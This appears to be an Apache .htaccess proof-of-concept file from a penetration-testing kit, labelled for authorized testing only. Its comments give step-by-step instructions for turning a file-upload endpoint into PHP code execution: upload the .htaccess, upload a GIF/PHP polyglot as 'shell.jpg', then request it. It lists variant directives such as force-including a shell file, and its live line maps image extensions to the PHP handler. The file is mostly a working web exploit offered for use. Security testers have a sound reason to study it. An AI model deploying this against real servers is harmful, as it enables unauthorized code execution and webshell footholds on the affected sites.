# ============================================================================
# Safe PoC -> x8bitranjit
# Apache config-upload PoC - x8bitranjit lab style. Authorized testing only.
#
# WHAT THIS DEMONSTRATES: if a platform lets you upload a file named
# .htaccess into a SERVED directory, you redefine how the server executes
# files there - every following "image" becomes executable PHP.
#
# WHERE TO USE: any upload endpoint storing to a web-served directory on
# Apache (AllowOverride not None). Upload THIS file first, then upload
# upload_polyglot_gif_php.gif (from this folder) as "shell.jpg", then:
#   GET /uploads/shell.jpg  ->  PHP executes, benign marker prints.
#
# WHAT TO EDIT: nothing - shipped benign (marker echo only). The payload
# PHP is in upload_polyglot_gif_php.gif.
#
# VARIANTS:
#   AddType application/x-httpd-php .abc          # map a new extension
#   php_value auto_prepend_file /var/www/html/up/shell.gif   # force-include
#   AddOutputFilter INCLUDES .jpg                 # SSI in jpg
#
# CONFIRM: marker text appears in the response. CLEANUP: delete BOTH files
# (config + payload) - ledger it (POST_EXPLOITATION_CHECKLIST PEXP-015).
# KIT CROSS-REF: UPL-009 (config-file upload), UPL-010 (benign webshell).
# ============================================================================

AddType application/x-httpd-php .jpg .png .gif
